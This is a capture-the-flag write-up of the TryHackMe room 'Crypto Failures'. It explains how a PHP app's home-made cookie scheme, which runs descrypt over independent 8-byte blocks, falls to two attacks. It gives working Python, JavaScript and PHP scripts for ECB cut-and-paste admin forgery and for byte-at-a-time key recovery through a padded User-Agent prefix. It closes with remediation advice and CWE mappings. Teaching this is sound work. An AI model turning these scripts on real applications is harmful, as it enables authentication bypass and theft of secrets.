# Crypto Failures — TryHackMe Writeup

> **Platform:** TryHackMe · **Category:** Web / Applied Cryptography
> **Difficulty:** Medium · **Author-supplied goal:** *"First exploit the weakness of the encryption scheme the simplest way, then find the encryption key."*

**TL;DR** — A PHP app authenticates users with a home-made "encrypted" SSO cookie. The scheme is not encryption at all: it hashes the plaintext `user:User-Agent:SECRET_KEY` in independent 8-byte chunks with `crypt()` (traditional DES / *descrypt*) under a per-cookie salt, and concatenates the results. Two independent weaknesses fall out of that design:

1. **Blocks are independent and unauthenticated → ECB cut-and-paste.** Only the first block depends on the username, so `guest` → `admin` is a one-block swap that needs **no key**. This yields the **web flag**.
2. **The salt is public and we control a chosen prefix (the User-Agent) that sits right before the secret → byte-at-a-time recovery.** The key is reconstructed **one character at a time, offline**, regardless of its entropy. This yields the **encryption key**.

| Objective | Result |
|---|---|
| Web flag | `THM{ok_you_f0und_w3b_fl4g_6c██████}` |
| Encryption key (`ENC_SECRET_KEY`) | `THM{Traditional_Own_Crypto_is_Always_Surprising!_and_this_hopefully_is_not_easy_to_crack_e41d20b5b0989cac██████████████████████████████████████████████████████████████████████████████████████████████████████████████2140525b9}` |

*(flag and key partially redacted)*

---

## 1. Recon

```text
$ nmap -sCV -O -Pn -p- <target>
22/tcp open  ssh   OpenSSH 8.9p1 Ubuntu (protocol 2.0)
80/tcp open  http  Apache httpd 2.4.59 ((Debian))
```

```text
$ curl -I http://crypto.thm
HTTP/1.1 302 Found
Server: Apache/2.4.59 (Debian)
X-Powered-By: PHP/8.3.8
Set-Cookie: secure_cookie=Vt...Vt...; Max-Age=3600; path=/
Set-Cookie: user=guest; Max-Age=3600; path=/
Location: /
```

Two cookies are issued on first visit:

* `secure_cookie` — a long blob that looks like base64 with a repeating 2-character token,
* `user=guest` — plaintext.

`view-source` of the landing page leaks three deliberate hints, **all** of which matter:

| Hint (as rendered) | What it points to |
|---|---|
| `en<b>crypt</b>ion` (the word **crypt** is bolded) | The encoding alphabet is the `crypt`/radix-64 set `./0-9A-Za-z` |
| "traditional **military grade** encryption" | `crypt()` with a 2-char salt = **traditional DES** (*descrypt*) |
| `<!-- TODO remember to remove .bak files-->` | Source (and the key) leak via a `.bak` backup |

---

## 2. Source disclosure

The `.bak` hint is literal — the landing page is `index.php`, so:

```bash
curl -s http://crypto.thm/index.php.bak
```

Relevant logic (trimmed):

```php
function generate_cookie($user, $ENC_SECRET_KEY) {
    $SALT = generatesalt(2);                               // random 2 chars [0-9a-zA-Z]
    $s = $user . ":" . $_SERVER['HTTP_USER_AGENT'] . ":" . $ENC_SECRET_KEY;
    setcookie("secure_cookie", make_secure_cookie($s, $SALT), time()+3600, '/');
    setcookie("user", "$user", time()+3600, '/');
}

function make_secure_cookie($text, $SALT) {
    $out = '';
    foreach (str_split($text, 8) as $el)                  // 8-char chunks
        $out .= crypt($el, $SALT);                        // each chunk hashed independently
    return $out;
}

function verify_cookie($ENC_SECRET_KEY) {
    $user   = $_COOKIE['user'];                           // username taken from PLAINTEXT cookie
    $string = $user . ":" . $_SERVER['HTTP_USER_AGENT'] . ":" . $ENC_SECRET_KEY;
    $salt   = substr($_COOKIE['secure_cookie'], 0, 2);    // salt = first 2 chars of the cookie
    return make_secure_cookie($string, $salt) === $_COOKIE['secure_cookie'];
}

// main:
if ($user === "admin") { echo 'congrats: <FLAG>. Now I want the key.'; }
```

---

## 3. Anatomy of the "encryption"

`crypt($chunk, $salt)` with a 2-character salt produces a **13-character** traditional-DES hash: `2 salt chars + 11 hash chars`. `make_secure_cookie` chops the plaintext into 8-char chunks and concatenates one `crypt()` per chunk. So:

```
plaintext:  guest : <User-Agent> : <ENC_SECRET_KEY>
            └──────────── split into 8-char chunks ───────────┘
cookie:     crypt(chunk0,S) crypt(chunk1,S) crypt(chunk2,S) ...
            └─13 chars──────┘└─13 chars─────┘...
```

Key facts that drive both attacks:

* **The repeating 2-char "delimiter" is the salt.** Every `crypt()` output begins with the same salt `S`, so the cookie reads `S<hash>S<hash>...`. In my first capture `S` happened to be `Vt`; a fresh cookie uses a **new random salt** (`Is`, `lb`, `so`, ...). *Always read the salt from `cookie[:2]` — never hardcode it.*
* **On the wire** the blob is standard base64 with `+`→`.`; `/` is present and `setcookie()` URL-encodes it to `%2F`. URL-decode before slicing and re-encode when sending; PHP's `$_COOKIE` auto-decodes server-side, so verification compares raw-vs-raw.
* **The server never decrypts the username** (`crypt` is one-way). It reads the name from the **plaintext `user` cookie**, rebuilds `user:UA:KEY`, re-hashes it, and checks it matches `secure_cookie`.

> **Mental model:** `user` = the *claim* ("I am admin"); `secure_cookie` = the *proof* that must be consistent with that claim. Both must be changed together — changing only one fails with *"You are not logged in"*.

| `user` cookie | `secure_cookie` | Result |
|---|---|---|
| `admin` | guest blob | verify FAILS → not logged in |
| `guest` | admin blob | verify FAILS → not logged in |
| `admin` | admin blob | **FLAG** |

---

## 4. Part 1 — Web flag via ECB cut-and-paste

Because each 8-byte block is hashed **independently** (the defining property of ECB) and there is **no MAC over the whole token**, blocks can be swapped freely.

`guest:` and `admin:` are both **6 characters**, so every plaintext byte from offset 6 onward (`<UA>:<KEY>`) is **byte-identical** between a guest and an admin cookie. Only **block 0** (bytes 0–7) encodes the username.

```
guest:  [ guest:Mo ][ zilla/5. ][ 0 (Windo ] ... [ :KEY... ]
admin:  [ admin:Mo ][ zilla/5. ][ 0 (Windo ] ... [ :KEY... ]
          ▲ CHANGED   └──────────── IDENTICAL ─────────────┘
```

**Forge = recompute block 0 for `admin`, copy the rest verbatim.** No key required.

* `UA[0:2]` (the two UA bytes that land in block 0) is recovered by brute-forcing block 0: find `XY` such that `crypt("guest:"+XY, salt) == block0`. Browsers → `Mo` (Mozilla); curl → `cu`.
* The forged cookie must be presented with the **same UA** that generated the tail. Pasting into the same browser works automatically; a script controls the UA end-to-end by using `UA="A"` (`guest:A:` is exactly 8 chars → a clean block 0).

### PoC (self-contained, prints the flag)

```python
#!/usr/bin/env python3
import requests, crypt, urllib.parse as u
BASE = "http://crypto.thm/"; UA = {"User-Agent": "A"}

# fresh guest cookie (do not follow the redirect — Set-Cookie is on the 302)
r    = requests.get(BASE, headers=UA, allow_redirects=False)
raw  = u.unquote(r.cookies["secure_cookie"])
salt = raw[:2]                                   # random per-cookie salt, NOT hardcoded

# swap ONLY block 0: guest:A: -> admin:A:, keep the tail (UA + key) untouched
forged = crypt.crypt("admin:A:", salt) + raw[13:]
fc     = u.quote(forged, safe='')

h = {"User-Agent": "A", "Cookie": f"secure_cookie={fc}; user=admin"}
print(requests.get(BASE, headers=h, allow_redirects=False).text)
# -> congrats: THM{ok_you_f0und_w3b_fl4g_6c██████}. Now I want the key.
```

### Browser variant

To view the flag on the site, set both cookies in DevTools → Application (or the console) and reload:

```javascript
document.cookie = "user=admin; path=/";
document.cookie = "secure_cookie=<forged-block0 + original-tail>; path=/";
location.reload();
```

A compact PHP equivalent (uses the server's native `crypt`, so it is byte-exact):

```php
$salt  = substr($cookie, 0, 2);
$guest = crypt("guest:Mo", $salt);
if (substr($cookie,0,13) !== $guest) die("block0 != guest:Mo — check UA prefix\n");
echo str_replace($guest, crypt("admin:Mo", $salt), $cookie), "\n";
```

> ⚠️ The PHP one-liner silently no-ops if the UA does not start with `Mo`; keep the `block0` assertion.

---

## 5. Part 2 — Recovering `ENC_SECRET_KEY` (byte-at-a-time)

### Why not just crack it

Isolating the key blocks (`UA="A"` → `guest:A:` = 8 chars → blocks 1..N are pure 8-char key chunks) and feeding them to `hashcat -m 1500` (descrypt) *works in principle*. But the key ends in **128 hex characters of pure entropy** (`...e41d20b5...525b9`), so brute-forcing those chunks is infeasible. A smarter, deterministic technique is required.

### The chosen-prefix technique

This is the classic **byte-at-a-time ECB decryption** (Cryptopals Set 2, Challenge 12), applied to `crypt`-DES blocks. It works because of a three-way combination:

1. `crypt` hashes each 8-byte block **independently and deterministically** — the same 8 bytes always produce the same hash, at any position.
2. We control the **User-Agent**, a chosen prefix sitting immediately before the secret (only a fixed `:` between). This lets us both **align** blocks and place **7 known bytes** next to **1 unknown key byte**.
3. The **salt is public** (`cookie[:2]`), so we compute candidate blocks **offline**.

Pad the UA with `A` until the next unknown key byte is the **last byte of an 8-byte block** whose other 7 bytes are known (`guest:` + padding + `:` + recovered-so-far). Then locally try all ≤95 printable candidates for that last byte and match against the corresponding block in the real cookie. Recover one byte, drop one `A` to slide the window, and repeat.

```
recover byte 1:   guest:AA … AAAAAA:?      (try AAAAAA:a … AAAAAA:T → match → 'T')
recover byte 2:   guest:AA … AAAAA:T?
      …
later:            guest:AA … AA:THM{?      → the key itself is a THM{…} string
```

> The identical repeated blocks you see in the cookie chain are `crypt("AAAAAAAA")` from the padding — the same ECB tell also lets you auto-detect block size and alignment.

### PoC (recovers the full key)

```python
#!/usr/bin/env python3
import requests, crypt, string, urllib.parse as u
BASE = "http://crypto.thm/"

def oracle(ua):
    r = requests.get(BASE, headers={"User-Agent": ua}, allow_redirects=False)
    return u.unquote(r.cookies["secure_cookie"])

cs, rec = string.printable[:95], ""
while True:
    ua     = "A" * ((8 - (len(rec) % 8)) % 8 + 8)   # pad so the target byte is last in its block
    raw    = oracle(ua); salt = raw[:2]
    pos    = 6 + len(ua) + 1 + len(rec)             # index of the unknown byte
    target = raw[(pos//8)*13 : (pos//8)*13 + 13]    # its 13-char block in the cookie
    seven  = f"guest:{ua}:{rec}"[pos-7:pos]         # the 7 known bytes of that block
    nxt    = next((g for g in cs if crypt.crypt(seven+g, salt) == target), None)
    if nxt is None: break
    rec += nxt; print(rec)
    if rec.endswith("}"): break                     # key is a THM{...} string
print("ENC_SECRET_KEY =", rec)
```

Cost: ~1 request per character plus ≤95 local `crypt()` calls each — **deterministic and entropy-independent**. It beats brute force precisely because chosen-prefix + public salt sidestep the random hex tail (the key literally taunts `is_not_easy_to_crack`).

---

## 6. `hashcat` vs. byte-at-a-time

| | `hashcat -m 1500` (descrypt brute) | Byte-at-a-time (chosen prefix) |
|---|---|---|
| Needs the key to be low-entropy | **Yes** (fails on the 128-hex tail) | **No** |
| Uses the public salt | Reads it from the hash | Computes candidates with it |
| Uses UA/prefix control | No | **Yes** (the whole trick) |
| Outcome here | Recovers readable prefix, stalls on hex tail | Recovers **the entire key** |

---

## 7. Root cause & remediation

The core mistake is **using a one-way password hash (`crypt`/descrypt) as if it were encryption *and* integrity**. It is neither.

* **Do not roll your own cookie crypto.** Use an authenticated, keyed construction: e.g. an HMAC (or an AEAD like AES-GCM) over the *entire* token with a server-side secret. Integrity must cover the whole payload, not per-block.
* **Never process data in independent blocks with a keyless/static-salt primitive** — that is what enables cut-and-paste.
* **Keep secrets out of the signed/hashed plaintext**, and never expose them where a chosen prefix can peel them off byte-by-byte.
* **Remove backup/source files** (`.bak`, `.old`, `~`) from the web root; they disclosed the algorithm and the key path.

---

## 8. Mapping

| Finding | OWASP / CWE / WSTG |
|---|---|
| Home-made hash used as "encryption" | **A02:2021 Cryptographic Failures** |
| No integrity/MAC over the token → cut-and-paste | CWE-353 (WSTG-SESS-02) |
| Weak, fast, 8-char-limited hash (descrypt) | CWE-916 (WSTG-CRYP-04) |
| 2-char, public, one-per-token salt | CWE-330 / CWE-760 |
| Secret embedded in hashed plaintext + chosen-prefix leak | CWE-321 (key management) |
| Source/key backup left in web root | CWE-530 (WSTG-CONF-04) |

**Design amplifier:** splitting a long key into independent 8-char descrypt blocks makes it no stronger than its ≤8-char pieces.

---

## 9. Lessons

* One broken scheme produced **two distinct classes of finding**: an authorization bypass needing **no secret** (cut-and-paste), and a full secret disclosure via a **chosen-plaintext** oracle. Framing a writeup around both is stronger than presenting a single trick.
* Recognizing the *pattern* is the real skill: "I control a prefix that sits right before the secret, and I know the salt" ⇒ byte-at-a-time. You do not need to invent it — you need to spot it in the wild.
* Read the salt from the cookie, not from your first capture. Anchoring on one sample (`Vt`) is exactly what broke the first forge attempt.

---

*Authorized TryHackMe lab. Flag and key redacted per responsible-disclosure hygiene.*
